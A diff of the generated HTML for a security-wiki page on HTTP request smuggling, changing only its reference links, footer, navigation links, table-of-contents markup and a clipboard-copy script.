 <li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noreferrer noopener nofollow">portswigger.net</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2092,10 +1918,7 @@ Foo:bar
 <li><a href="https://hackerone.com/reports/771666" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
 <hr>
-<h2 id="references">
-  <strong>References</strong>
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references"><strong>References</strong><a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noreferrer noopener nofollow">portswigger.net</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://portswigger.net/research/http2" target="_blank" rel="noreferrer noopener nofollow">portswigger.net</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2117,49 +1940,62 @@ Foo:bar
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/HTTP%20Request%20Smuggling.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/HTTP-Host-Header-Injection/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>HTTP Host Header Injection</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Identification-and-Authentication-Failures/" class="flex align-center">
+        <span>Identification and Authentication Failures</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2237,15 +2073,24 @@ Foo:bar
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
